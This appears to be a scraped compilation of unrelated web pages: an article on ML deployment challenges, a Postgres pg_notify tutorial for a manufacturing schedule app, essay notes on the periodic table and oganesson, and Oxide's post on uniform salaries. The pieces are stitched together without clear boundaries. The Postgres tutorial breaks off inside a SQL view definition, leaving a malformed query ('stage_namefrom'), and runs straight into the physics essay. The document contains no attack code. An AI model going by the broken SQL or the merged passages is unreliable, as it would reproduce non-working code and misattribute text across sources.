<p><em>However, discussing applications of ML in theory is much different than actually applying ML models at scale in production. In this article, we walk through common challenges and corresponding solutions to making ML a force multiplier for your data organization.&nbsp;</em></p>



<p>From generating your weekend bike route on Google Maps to helping you discover your next binge-worthy show on Netflix, machine learning (ML) has evolved well beyond a theoretical buzzword into a powerful technology that most of us use every day.&nbsp;</p>



<p>For the modern business, the appetite for ML has never been stronger. But while certain industries have been transformed by the automation made possible by ML—think <a href="https://www.businessinsider.com/ai-in-banking-report" target="_blank" rel="noopener">fraud detection</a> in finance and <a href="https://customerthink.com/explained-working-and-advantages-of-a-recommendation-engine/" target="_blank" rel="noopener">personalized product recommendations</a> in e-commerce—the hard truth is that many ML projects fail before they ever see the light of day.&nbsp;</p>



<p>In October 2020, <a href="https://www.gartner.com/en/newsroom/press-releases/2020-10-19-gartner-identifies-the-top-strategic-technology-trends-for-2021#:~:text=Gartner%20research%20shows%20only%2053,a%20production%2Dgrade%20AI%20pipeline." target="_blank" rel="noopener">Gartner reported</a> that only 53% of projects make it from prototype to production—and that’s at organizations with some level of AI experience. For companies still working to develop a data-driven culture, that number is likely far higher, with <a href="https://venturebeat.com/2019/07/19/why-do-87-of-data-science-projects-never-make-it-into-production/" target="_blank" rel="noopener">some failure-rate estimates</a> soaring to nearly 90%.&nbsp;</p>



<p>Data-first tech companies like Google, Facebook, and Amazon are transforming our daily lives with ML, while many other well-funded and highly talented teams are still struggling to get their initiatives off the ground. But why does this happen? And how can we fix it?</p>



<p><strong>We share the four biggest challenges modern data teams face when adopting ML at scale— and how to overcome them.&nbsp;</strong></p>



<h3>Misalignment between actual business needs and ML objectives</h3>



<div><figure><img loading="lazy" src="https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-1024x683.jpg" alt="" width="768" height="512" srcset="https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-1024x683.jpg 1024w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-300x200.jpg 300w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-768x512.jpg 768w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-1536x1024.jpg 1536w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-2048x1365.jpg 2048w" sizes="(max-width: 768px) 100vw, 768px"><figcaption>When your business objectives and ML goals are misaligned, all of your best laid plans are bound to fail, just like that model you trained with stale data.

<p>The first challenge is strategic, not technical: starting with a solution instead of a clearly defined problem.&nbsp;</p>



<p>As companies race to incorporate ML into their organizations, leaders may hire data scientists and ML practitioners to automate or improve processes without a mature understanding of <a href="https://developers.google.com/machine-learning/problem-framing/good" target="_blank" rel="noopener"><strong>which problems are actually suitable for ML</strong></a> to solve. And even when the business problem is a good fit for ML, without a shared definition of what success looks like, projects can languish in experimentation mode for months while stakeholders wait for an idealized level of machine-like perfection that can never be reached.&nbsp;</p>



<p>Machine learning is not magic, it will not solve every problem perfectly, and should, by nature, continue to evolve over time. Sometimes, a model merely achieving the same results as humans is a worthy project—errors and all.&nbsp;</p>



<p>Before starting any project, ask your team or your stakeholders: <em>What business problem are we trying to solve? Why do we believe that ML is the right path? What is the measurable threshold of business value this project is trying to reach? What does “good enough” look like?&nbsp;</em></p>



<p>Without these clear, shared definitions articulated at the outset, many worthy ML projects will never reach production and valuable resources will be wasted. Solve a business problem using ML and not just embark on a ML project for checking off the ML box.</p>



<h3>Model training that doesn’t generalize</h3>



<p>With a clearly defined business problem and targeted success metrics, your potential pitfalls get more technical. During the model training stage, issues related to your training data or model fit are the likeliest culprit for future failure.&nbsp;</p>



<p>The goal of <a href="https://elitedatascience.com/model-training" target="_blank" rel="noopener"><strong>model training</strong></a> is to develop a model that can generalize, or make accurate predictions when given new data because it understands the relationships between data points and can identify trends. Your training dataset should be clean, sizable, and representative of the real-time data your model is expected to process once in production. No where has one seen clean data in a production environment. Expect to spend considerable time cleaning, labeling&nbsp; and feature engineering just to get the data ready.</p>



<p>Representative training data is also key: If your training data doesn’t reflect the actual datasets your model will encounter, you may end up with a model that won’t perform once you’ve reached testing or production.&nbsp;</p>



<p>Another issue that can occur during training is overfitting and underfitting. Overfitting happens when a model learns <em>too much </em>and produces outputs that fit too closely with your training data.</p>



<p>Underfitting is simply the opposite—your model doesn’t learn enough to make useful predictions on even the training data itself, let alone new data it will encounter in testing or production.</p>



<h3>Testing and validation issues</h3>



<p>As you test and validate your models, new challenges can arise from merging multiple data streams and making updates to improve performance. Changes to data sources, model parameters, and <a href="https://en.wikipedia.org/wiki/Feature_engineering" target="_blank" rel="noopener"><strong>feature engineering</strong></a> all introduce room for error.&nbsp;</p>



<p>This may also be the stage when you detect overfitting or underfitting in your model—a model that performed wonderfully during training but fails to produce useful results during testing may be overfit.&nbsp;</p>



<p>Even at companies like Google, where ML engineers abound, <a href="https://www.technologyreview.com/2020/04/27/1000658/google-medical-ai-accurate-lab-real-life-clinic-covid-diabetes-retina-disease/" target="_blank" rel="noopener">surprises</a> in your product models can—and will—arise.&nbsp;</p>



<h3>Deployment and serving hurdles</h3>



<p>Deploying ML projects is rarely simple, and teams typically can’t use consistent workflows to do so—since ML projects solve a wide range of business problems, there’s a similarly wide range of ways to host and deploy them. For example, some projects require batched predictions on a regular basis, while others need to generate and deliver predictions on-demand when an application makes an API request to predict using the model. (This is part of why it’s challenging to make models apply to different use cases, no matter how appealing it may sound to executives who may view ML models as more magic than narrowly focused functions.)</p>



<p>Additionally, some ML projects can require a lot of resources, and cross-functional teams need to agree upon priorities of deployment. Engineers only have so many things they can productionalize, and as we’ve discussed, ML projects are much more than models and algorithms: most will need infrastructure, alerting, maintenance, and more to be successfully deployed.&nbsp;</p>



<p>This is why it’s so important to articulate the business problem clearly at the outset, agree upon what success looks like, design an end-to-end solution, and have a shared understanding of your ML project’s value compared to other priorities. Without this strategic plan, your project may never receive the engineering resources it needs to finally reach production.&nbsp;</p>



<p>For just one example, Netflix never productionalized its <a href="https://www.wired.com/2012/04/netflix-prize-costs/" target="_blank" rel="noopener">million-dollar prize-winning recommendation algorithm</a> due to the winning model’s complexity to implement—instead choosing another submission that was simpler to integrate.&nbsp;&nbsp;</p>



<h3>Tactics for scalable ML in production</h3>



<div><figure><img loading="lazy" src="https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/kobu-agency-67L18R4tW_w-unsplash-1024x687.jpg" alt="" width="768" height="515" srcset="https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/kobu-agency-67L18R4tW_w-unsplash-1024x687.jpg 1024w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/kobu-agency-67L18R4tW_w-unsplash-300x201.jpg 300w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/kobu-agency-67L18R4tW_w-unsplash-768x515.jpg 768w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/kobu-agency-67L18R4tW_w-unsplash-1536x1030.jpg 1536w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/kobu-agency-67L18R4tW_w-unsplash-2048x1373.jpg 2048w" sizes="(max-width: 768px) 100vw, 768px"><figcaption>Machine learning isn’t magic, but it is powerful—and often misunderstood.&nbsp; Sort of like this paper stick figure. Image courtesy of <a href="https://unsplash.com/photos/67L18R4tW_w" target="_blank" rel="noopener">Kobu Agency</a> on <a href="http://www.unsplash.com/" target="_blank" rel="noopener">Unsplash.</a></figcaption></figure></div>



<p>Beyond strategic planning and staffing, there are concrete steps you can take to help scale your ML production.&nbsp;</p>



<h4>Lean into the cloud</h4>



<p>If your teams are working locally instead of in the cloud, it’s time to shift. Working in the cloud is the “glue” that keeps model training and deployment workflows in lockstep. Most vendors and open-source tools are developed for the cloud, and once there, it’s much easier to automate processes. Testing, training, validation and model deployment needs to be a repeatable process, it should not go from local Python code to a production environment.</p>



<h4>Leverage a DevOps approach</h4>



<p>Just as we’ve talked about applying DevOps practices to data, like <a href="https://www.montecarlodata.com/how-to-make-your-data-pipelines-more-reliable-with-slas/"><strong>setting data SLAs</strong></a> and measuring data health along <a href="https://www.montecarlodata.com/introducing-the-5-pillars-of-data-observability/">observability pillars</a>, ML teams can follow in DevOps’ footsteps by implementing the <strong><a href="https://www.infoworld.com/article/3271126/what-is-cicd-continuous-integration-and-continuous-delivery-explained.html" target="_blank" rel="noopener">Continuous Integration (CI) and Continuous Delivery (CD)</a> model</strong>, while introducing <a href="https://cloud.google.com/solutions/machine-learning/mlops-continuous-delivery-and-automation-pipelines-in-machine-learning" target="_blank" rel="noopener">Continuous Training (CT)</a>. By setting up agile build cycles and tools, ML teams can more rapidly deliver changes into the codebase and improve overall performance.&nbsp;</p>



<p>Similar to DevOps best practices, ML teams should use containerization to consistently run software across any type of device and make it simpler for engineers to productionalize their work. Keeping a consistent and visible build process that deploys smaller changes more frequently allows the team to work more smoothly and have more insight into what’s working well, and what’s not. Visibility also helps would-be code “gatekeepers” trust the build process and speed up the ML team’s workflow.&nbsp;</p>



<p>Investing time to build a strategic MLOps team and processes will help by reducing the likelihood of a project stalling out before production, and making continuous improvements feasible—setting every project up for long-term success.</p>



<h4>Invest in observability and monitoring&nbsp;</h4>



<p>Finally, the primary rule of machine learning is that your outcomes will only be as good as your inputs. Healthy data is absolutely essential to ML. Without clean data and working pipelines, models won’t be able to perform to their fullest potential and may fail to make accurate predictions.&nbsp;</p>



<p>And when you’re relying on ML to make important business decisions, you don’t want to find out about a broken pipeline or inaccurate data after those outputs have already been delivered.&nbsp;</p>



<p>That’s why <a href="https://www.montecarlodata.com/introducing-the-5-pillars-of-data-observability/"><strong>data observability</strong></a>, which provides a full understanding and comprehensive monitoring of data health—and can prevent bad data from reaching your ML models in the first place—is well worth the investment.&nbsp;</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              <p>We’re going to take a look how I used a Postgres feature, <code>pg_notify</code>, to power a work schedule for a manufacturing company. This particular product went through a dozen or so stages of manufacture, and each time a product advanced to its next stage the worker would record that progress from their workstation. The app we will build in this post displayed this schedule and allowed everyone to see the day’s progress.</p><h3 id="the-observer-pattern-in-sql">The Observer Pattern in SQL</h3><p>If you’re only used to using the standards of SQL in Postgres, the <code>NOTIFY</code> and <code>LISTEN</code> commands might not be familiar. But with these two commands you can implement something akin to the Observer pattern, but in your SQL engine!</p><p>The Observer pattern allows one class of object to “listen” for incoming events and another class to send events to those listeners. This pattern is commonly used for instances where data is being updated or changed, and several possibly unrelated objects need to react to those changes.</p><h3 id="observer-examples">Observer Examples</h3><p>Listening to state changes from a Redux store from inside of a React component is a common example of this pattern. Many React components listen to a single part of the Redux store. Android’s LiveData is another great example of this pattern, where observers can be created to watch for changes and immediately update the state and UI of an app.</p><h3 id="observing-in-postgresql">Observing in PostgreSQL</h3><figure><img src="https://blog.arctype.com/content/images/2021/03/Screen-Shot-2021-02-03-at-19.18.43.png" alt="" srcset="https://blog.arctype.com/content/images/size/w600/2021/03/Screen-Shot-2021-02-03-at-19.18.43.png 600w, https://blog.arctype.com/content/images/size/w1000/2021/03/Screen-Shot-2021-02-03-at-19.18.43.png 1000w, https://blog.arctype.com/content/images/2021/03/Screen-Shot-2021-02-03-at-19.18.43.png 1600w" sizes="(min-width: 720px) 720px"><figcaption>System architecture with pg_notify as the event bus.</figcaption></figure><p><code>NOTIFY</code> and <code>LISTEN</code> work together to allow you to implement this design within your Postgres database. Generally, <code>NOTIFY</code> will be called inside of a SQL query, oftentimes within a trigger. <a href="https://blog.arctype.com/learn-sql-triggers/">Triggers and event-based models go together well.</a> </p><!--kg-card-begin: html--><p>
    <h3>Looking for a collaborative SQL Editor?</h3>
    
</p><!--kg-card-end: html--><p><code>LISTEN</code> is called from your Postgres client. When an event is triggered by <code>NOTIFY</code> the client will be notified. The event contains a payload so the client can tell what event was triggered (this can also contain metadata or actual data from the database). How your client receives this notification and how you are able to process it from there varies from client to client. In our example, the client will use WebSockets to update each connected schedule client after it receives the signal from <code>pg_notify</code>.</p><h2 id="building-the-work-schedule-app">Building the Work Schedule App</h2><h3 id="schema-design">Schema Design</h3><p>Let’s begin on the Postgres side. We are modeling items that are being manufactured. Items in production will be represented by the <code>production_item</code> table. Each <code>production_item</code> has an associated <code>product_id</code> &nbsp;and a current stage of production. </p><figure><img src="https://blog.arctype.com/content/images/2021/03/Frame-27--1-.png" alt="" srcset="https://blog.arctype.com/content/images/size/w600/2021/03/Frame-27--1-.png 600w, https://blog.arctype.com/content/images/size/w1000/2021/03/Frame-27--1-.png 1000w, https://blog.arctype.com/content/images/2021/03/Frame-27--1-.png 1498w" sizes="(min-width: 720px) 720px"><figcaption>ERD Diagram made with <a href="https://blog.arctype.com/erd-builder/">Arctype's Free Figma template</a>.</figcaption></figure><p>We could store the current production stage as a column in the <code>production_item</code> table, but that would only allow us to see what stage the item is in currently. Instead, we’ll use a <code>production_item_wip</code> (work-in-progress) table where each row will contain a timestamp as the item progresses through the stages of production. Let’s also create a table that stores all the possible stages of production, <code>production_stage</code>. <code>production_stage</code> will have an <code>idx</code> integer column to store the order in which the stages occur. The query below creates the <code>production_item_wip</code> table, as an example.</p><pre><code>create table production_item_wip (  
  id serial primary key,  
  insert_time timestamp default NOW(),  
  production_item_id int references production_item(id),  
  production_stage_id int references production_stage(id),  
  employee_id int references employee(id)  
); </code></pre><p>PROTIP: You may notice I’ve included <code>insert_time</code> on every table. We will not need to use this column on every table for this particular example right now, but I’ve found that it often proves useful in the future. I spend a significant amount of time building queries and extracting useful statistics, and countless times I’ve been unable to use data because it lacked an <code>insert_time</code>. I would err on the side of adding it when designing database schema in general, if you’re unsure whether or not you should.</p><h3 id="postgres-notify-syntax">Postgres NOTIFY Syntax</h3><p>Using NOTIFY to send an event is dead simple! Here is a trigger procedure that sends a notification to the order_progress_event channel.</p><pre><code>create
or replace function fn_production_stage_modified() returns trigger as $psql$
begin
  perform pg_notify(
    'order_progress_event',
    'Time to refresh those screens!'
  );return new;
end;$psql$ language plpgsql;</code></pre><p><code>pg_notify</code> lends itself well to being used within a trigger when used to deliver real-time data streaming. However, you could just as easily call <code>pg_notify</code> from a regular SQL query: <code>select pg_notify('order_progress_event', 'Hello world!');</code></p><p>Inside of a PL/pgSQL procedure, you cannot <code>SELECT</code> a function, like <code>pg_notify</code>, that returns void. Doing so will cause a Postgres error. That’s why in the first example we use <code>perform</code>, while in the second we can simply use <code>select</code>.</p><p>With that procedure created, let’s add the actual trigger so that whenever an item moves along in the production process, and thus another row is inserted for <code>production_item_wip</code>, the procedure above is called.</p><pre><code>create trigger production_stage before
insert
  on production_item_wip for each row execute procedure fn_production_stage_modified();</code></pre><!--kg-card-begin: html--><p>
    <h3>The Collaborative SQL Editor</h3>
    
</p><!--kg-card-end: html--><p>That’s it! In this example the payload is the same each time. You could send actual data rather than just an alert, but in this example I prefer to send a basic notification so the client application can receive it and then in turn, select <em>exactly</em> what it needs in a separate query.</p><p>Encoding data within a notification, whether it’s a push notification or one from something like <code>pg_notify</code>, requires you to abstract away the source of the notification, assuming the data is normally delivered via an HTTP API. Using notifications as a “hint” for your software to reach out and get fresh data from an HTTP API simplifies the process and helps you reduce the number of different data sources you need to maintain.</p><h3 id="postgres-listen-syntax">Postgres LISTEN Syntax</h3><p>Listening to a channel is even simpler: <code>LISTEN order_progress_event;</code> </p><p>That really is all.</p><p>When this event is called, we’ll want to select the latest production data for the day. Here’s a view that will show how many products have progressed through each production stage today:</p><pre><code>create view view_daily_production_stats as
select
  count(1) as stage_count,
  ps.name as stage_namefrom production_item_wip piw

      <strong>Status:</strong> <em>Rough working notes – me
      thinking aloud. Speculative, and likely contains errors,
      misconceptions, and omissions; thoughtful, informed comments are
      welcome. Intended for a general scientifically curious audience,
      not requiring much detailed specialist background.</em>
    </p>
    
    <p>
      It is sometimes said physics is nearing its end – closing
      in on a “theory of everything” – because we
      understand so much about the basic rules governing the particles
      and forces in our universe. This is like asserting that computer
      science ended in 1936 with the Turing machine, computing's
      “theory of everything”. Of course, that's not what
      happened. Rather, the invention of the Turing machine opened a
      new creative frontier, enabling an extraordinary profusion of
      new ideas.
    </p>

    <p>
      Science is going through a similarly exciting transition
      today. Until recently humanity worked with matter much like we
      did computing prior to Turing, using a patchwork of bespoke
      tools and ideas. But now we understand the fundamentals of how
      matter works: we have a fantastic theory describing the
      elementary particles and forces, and we're getting increasingly
      good at manipulating matter. And so we're beginning to ask: what
      can we build, <em>in principle</em>? Not just in a practical
      sense, with the tools that happen to be at hand, but in a
      fundamental sense: what is allowed by the laws of physics?
    </p>

    <p>
      Of course, this implies a whole world of questions: What
      qualities are possible in matter? Can we do for matter what
      Turing and company did for computation? Can we invent new
      high-level abstractions and design principles for matter,
      similar to what people like John McCarthy and Alan Kay did for
      computing?  What design space is opened up when we control
      matter as well as we control pixels on a computer screen? What
      beautiful new design ideas are possible?
    </p>

    <p>
      Most of the matter in our everyday experience is constructed
      from just three particles: protons, electrons, and
      neutrons. These can be used to build an astonishing array of
      different things: diamonds; human beings; galaxies; black holes;
      iPhones. With sufficiently good tweezers and a lot of patience
      you could reassemble a human being into a bicycle of comparable
      mass; and vice versa.
    </p>

    <p>
      So, what else can we build from protons, electrons, and
      neutrons*<span>* Martin Rees has pointed out
      that we humans tend to engage in particle chauvinism, often
      assuming that what we think of as “ordinary matter”
      is all there is to matter. Indeed, I've engaged in just such a
      chauvinism in asserting above that “we understand the
      fundamentals of how matter works”.  However, based on what
      we currently suspect about dark matter, so-called
      “ordinary matter” may actually be rather unusual,
      the exception rather than the rule. Nonetheless, in the absence
      of a good understanding of dark matter I shall continue to
      engage in particle chauvinism, and restrict myself in this essay
      to ordinary matter. Indeed, I shall go further and restrict the
      discussion (mostly) to protons, electrons, and neutrons.
      </span>?
    </p>

    <p>
      It seems likely we can build things that would astonish us,
      things going radically beyond anything we can even conceive of
      today, much less build.
    </p>

    <p>
      Consider that ten million years ago conscious minds were absent
      from the earth, except in quite primitive forms. Might there be
      forms of matter possible which are as different from anything
      familiar to us today as consciousness is from a
      rock*<span>* Some people don't believe
      consciousness is a property of matter. There are limited senses
      in which that is reasonable: certainly, matter is a substrate,
      and aspects of consciousness may be independent of the details
      of that substrate, in a matter analogous to the way an algorithm
      has an existence independent of the computer it runs
      on. Nonetheless, I don't think there is much serious reason to
      doubt that consciousness is a property that emerges out of
      ordinary matter.</span>?
    </p>
    
    <p>
      What might those forms be?
    </p>

    <p>
      One way to explore the “what can we build?” question
      is to look at different <em>maps of matter</em>. Probably the
      best known such map is the periodic table, showing all the
      different types of atoms which make up most of the matter in the
      world around us. But there's many other maps of matter. There's
      phylogenetic trees, which show the relationship between
      different types of life. There's maps of the different types of
      stars, of the different phases of matter, of all the proteins
      we've found. And many more.
    </p>

    <p>
      In these notes we'll go on safari through several such maps of
      matter. We won't go too deep into any individual map –
      everything I discuss could be (often has been) the subject of
      PhD theses, or even an entire field. Instead, we're going to
      look rapidly at several different ways we explore matter. The
      purpose is to discern some general principles that can help us
      explore in generative ways.
    </p>

    <p>
      When I began writing these notes I had a whimsical question in
      mind: is there a single, unified map we can use to understand
      all of matter? I hoped the attempt to make such a unified map
      would give me some insight into the question “what can we
      build, in principle?” And so, as I wrote the notes I toyed
      with multiple ways of making a unified map. Eventually, I
      realized matter is too rich and variegated for a really good
      unified map to be possible. What's more, to do even a passing
      job these notes would need to be a hundred times longer!
      Nonetheless, I found the attempt stimulating. And so at the end
      of the notes I show a single diagram which encapsulates many of
      the ideas for exploration developed in these notes. It's grossly
      incomplete, but hopefully interesting and generative.
    </p>

    <h2>The strangest places in the periodic table</h2>

    <p>
      The physicist John Wheeler once stated a useful principle to
      guide research: “In any field, find the strangest thing
      and explore it”. One great thing about maps is that they
      suggest strange things. This is true even when the map itself is
      familiar, like the periodic table. We can ask ourselves: where
      are the strangest “places” in the periodic table?
      And then challenge ourselves to explore those places.
    </p>

    <p>
      One candidate for the strangest place in the periodic table is
      the most recently discovered chemical element, oganesson. It's
      the heaviest known element, with an atomic number of 118. It's
      highlighted below with a red circle in the bottom
      right*<span>* Image adapted from images due
      to users “Double sharp” and “Offnfopt”
      on <a href="https://commons.wikimedia.org/wiki/File:Simple_Periodic_Table_Chart-blocks.svg">Wikipedia</a>.</span>:
    </p>

    <center>
    <img src="https://futureofmatter.com/assets/periodic_table.svg" width="100%">
    </center>
    
    <p>
      Oganesson was discovered in 2002 by a team of scientists headed
      by Yuri Oganessian, after being predicted in 1895 by Hans Peter
      Jørgen Julius Thomsen. It was made by using calcium ions to
      bombard a target of californium atoms, at very high speed. Only
      a handful of oganesson atoms have ever been observed –
      around a half dozen, with several of those observations regarded
      as unconfirmed.
    </p>

    <p>
      We don't know much for sure about oganesson – the handful
      of atoms observed decayed too quickly to get much idea of what
      oganesson does. Despite this, intensive theoretical studies have
      been done, and some surprising predictions made. Oganesson is in
      the final column of the periodic table, and these are of course
      the “noble gases”, highly non-reactive gases like
      helium and argon.
    </p>

    <p>
      At least, that's the story we learn in high school chemistry. In
      fact, oganesson confounds these expectations. Theoretical
      calculations suggest oganesson is likely to be a solid
      semiconductor at standard temperature and pressure, not a
      gas. Furthermore, it may be significantly reactive, unlike the
      other noble gases*<span>* Clinton
      S. Nash, <a href="https://pubs.acs.org/doi/10.1021/jp050736o">Atomic
      and Molecular Properties of Elements 112, 114, and 118</a>
      (2005). Note that the other noble gases <em>are</em> at least
      somewhat reactive (disodium helide, anyone?)
      – <a href="https://en.wikipedia.org/wiki/Noble_gas_compound">Wikipedia's
      discussion is a good place to start</a> – but oganesson is
      predicted to be significantly moreso.</span>.
    </p>

    <p>
      There is a standard argument for why noble gases are
      non-reactive gases – the gist is to understand the
      electron orbital shell structure, the number of electrons in
      each, and why full shells are particularly stable and lead to
      non-reactive elements. What you learn from oganesson is that
      some of the principles underlying that argument can't be quite
      right. I must admit, I haven't worked through the details of how
      the standard argument breaks down (beyond quickly skimming the
      above paper); nonetheless, it's extremely useful to have a
      little flag in my head saying that the standard argument about
      electron orbitals and noble gases actually breaks down for some
      elements.  That argument is often presented as being based on
      universal principles, but those principles are not, in fact,
      universal.
    </p>

    
    <p>
      And so one benefit of exploring oganesson is that it improves
      other parts of your understanding of matter, even if only by
      informing you of limits to that understanding. And it pokes at
      you: the periodic table has the shape it does <em>because</em>
      of those underlying principles. If …</p></div></div>

March 4, 2021 | https://oxide.computer/blog/compensation-as-a-reflection-of-values/ | <a href="https://web.archive.org/web/*/https://oxide.computer/blog/compensation-as-a-reflection-of-values/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Compensation: the word alone is enough to trigger a fight-or-flight reaction in many. But we in technology have the good fortune of being in a well-compensated domain, so why does this issue induce such anxiety when our basic needs are clearly covered? If it needs to be said, it's because compensation isn't merely about the currency we redeem in exchange for our labors, but rather it is a proxy for how we are <em>valued</em> in a larger organization. This, in turn, brings us to our largest possible questions for ourselves, around things like meaning and self-worth.</p><p>So when we started Oxide -- as in any new endeavor -- compensation was an issue we had to deal with directly. First, there was the thorny issue of how we founders would compensate ourselves. Then, of course, came the team we wished to hire: hybrid local and remote, largely experienced to start (on account of <a href="https://www.youtube.com/watch?v=vvZA9n3e5pc">Oxide's outrageously ambitious mission</a>), and coming from a diverse set of backgrounds and experiences. How would we pay people in different geographies? How could we responsibly recruit experienced folks, many of whom have families and other financial obligations that can't be addressed with stock options? How could we avoid bringing people's compensation history -- often a reflection of race, gender, class, and other factors rather than capability -- with them?</p><p>We decided to do something outlandishly simple: take the salary that Steve, Jess, and I were going to pay ourselves, and pay that to everyone. The three of us live in the San Francisco Bay Area, and Steve and I each have three kids; we knew that the dollar figure that would allow us to live without financial distress -- which we put at $175,000 a year -- would be at least universally adequate for the team we wanted to build. And we mean everyone literally: as of this writing we have 23 employees, and that's what we all make.</p><p>Now, because compensation is the hottest of all hot buttons, it can be fairly expected that many people will have a reaction to this. Assuming you've made it to this sentence it means you are not already lighting us up in your local comments section (thank you!), and I want to promise in return that we know some likely objections, and we'll address those. But before we do, we want to talk about the benefits of transparent uniform compensation, because they are, in a word, profound.</p><p>Broadly, our compensation model embodies our <a href="https://oxide.computer/about/">mission, principles, and values</a>. First and foremost, we believe that our compensation model reflects our principles of <b>honesty</b>, <b>integrity</b>, and <b>decency</b>. To flip it around: sadly, we have seen extant comp structures in the industry become breeding grounds for dishonesty, deceit, and indecency. Beyond our principles, our comp model is a tangible expression of several of our values in particular:</p><ul><li><p>It has set the tone with respect to <b>teamwork</b>. In my experience, the need to "quantify" one's performance in exchange for justifying changes to individual compensation are at the root of much of what's wrong in the tech industry. Instead of incentivizing people to achieve together as a team, they are incentivized to advance themselves -- usually with sophisticated-sounding jargon like OKRs or MBOs, or perhaps reasonable-sounding (but ultimately misguided) mantras like "measure everything." Even at their very best, these individual incentives represent a drag on a team, as their infrequent calibration can prevent a team from a necessary change in its direction. And at worst, they leave individuals perversely incentivized and operating in direct opposition to the team's best interest. When comp is taken out of the picture, everyone can just focus on what we need to focus on: getting this outlandish thing built, and loving and serving the customers who are taking a chance on it.</p></li><li><p>It is an expression of our <b>empathy</b>. Our approach to compensation reflects our belief in treating other people the way that we ourselves want to be treated. There are several different dimensions for this, but one is particularly visceral: because we have not talked about this publicly, candidates who have applied to Oxide have done so assuming that we have a traditional comp model, and have braced themselves for the combat of a salary negotiation. But we have spoken about it relatively upfront with candidates (before they talk to the team, for example), and (as the one who has often had this discussion) the relief is often palpable. As one recent candidate phrased it to me: "if I had known about this earlier, I wouldn't have wasted time stressing out about it!"</p></li><li><p>It is (obviously?) proof-positive of our <b>transparency</b>. Transparency is essential for building <i>trust</i>, itself one of the most important elements of doing something bold together. One of the interesting pieces of advice we got early on from someone who has had outsized, repeated success: modulo private personnel meetings, make sure that every meeting is open to everyone. For those accustomed to more opaque environments, our level of transparency can be refreshing: for example, new Oxide employees have been pleasantly surprised that we always go through our board decks with everyone -- but we can't imagine doing it any other way. Transparent compensation takes this to an unusual (but not unprecedented) extreme, and we have found it to underscore how seriously we take transparency in general.</p></li><li><p>It has allowed whole new levels of <b>candor</b>. When everyone can talk about their salary, other things become easier to discuss directly. This candor is in all directions; without comp to worry about, we can all be candid with respect to our own struggles -- which in turn allows us to address them directly. And we can be candid too when giving public positive feedback; we don't need to be afraid that by calling attention to someone's progress, someone else will feel shorted.</p></li></ul><p>These are (some of!) the overwhelming positives; what about those objections?</p><ul><li><p>Some will say that this salary is too low. While cash compensation gets exaggerated all of the time, it's unquestionable that salaries in our privileged domain have gotten much higher than our $175,000 (and indeed, many at Oxide have taken a cut in pay to work here). But it's also true that $175,000 per year puts us each in the top 5% of US individual earners -- and it certainly puts a roof over our families' heads and food in their bellies. Put more viscerally: this is enough to not fret when your kids toss the organic raspberries into the shopping cart -- or when they devour them before you've managed to get the grocery bags out of the car! And speaking of those families: nothing is more anxiety-producing than having a healthcare issue compounded by financial distress due to inadequate insurance; Oxide not only offers the best healthcare plans we could find, but we also pay 100% of monthly premiums -- a significant benefit for those with dependents.</p></li><li><p>Some will say that we should be paying people differently based on different geographical locations. I know there are thoughtful people who pay folks differently based on their zip code, but (respectfully), we disagree with this approach. Companies spin this by explaining they are merely paying people based on their cost of living, but this is absurd: do we increase someone's salary when their spouse loses their job or when their kid goes to college? Do we slash it when they inherit money from their deceased parent or move in with someone? The answer to all of these is no, of course not: we pay people based on their work, not their costs. The truth is that companies pay people less in other geographies for a simple reason: because they can. We at Oxide just don't agree with this; we pay people the same regardless of where they pick up their mail.</p></li><li><p>Some will say that this doesn't scale. This is, at some level, surely correct: it's hard to envision a multi-thousand employee Oxide where everyone makes the same salary -- but it has also been (rightly) said that startups should do things that don't scale. And while it seems true that the uniformity won't necessarily scale, we believe that the values behind it very much will!</p></li><li><p>Some will say that this makes us unlikely to hire folks just starting out in their career. There is truth to this too, but the nature of our problem at Oxide (namely, technically very broad and very deep), the size of our team (very small), and the stage of our company (still pretty early!) already means that engineers at the earliest stages of their career are unlikely to be a fit for us right now. That said, we don't think this is impossible; and if we felt that we had someone much earlier in their career who was a fit -- that is, if we saw them contributing to the company as much as anyone else -- why wouldn't we reflect that by paying them the same as everyone else?</p></li><li><p>Some will say that this narrows the kind of roles that we can hire for. In particular, different roles can have very different comp models (sales often has a significant commission component in exchange for a lower base, for example). There is truth to this too -- but for the moment we're going to put this in the "but-this-can't-scale" bucket.</p></li><li><p>Some will say that this doesn't offer a career ladder. Uniform compensation causes us to ask some deeper questions: namely, what <em>is</em> a career ladder, anyway? To me, the true objective for all of us should be to always be taking on new challenges -- to be unafraid to learn and develop. I have found traditional ladders to not serve these ends particularly well, because they focus us on competition rather than collaboration. By eliminating the rung of compensation, we can put the focus on career development where it belongs: on supporting one another in our self-improvement, and working together to do things that are beyond any one of us.</p></li><li><p>Some will say that we should be talking about equity, not cash compensation. While it's true that startup equity is important, it's also true that startup equity doesn't pay the orthodontist's bill or get the basement …</p></li></ul></div></div>

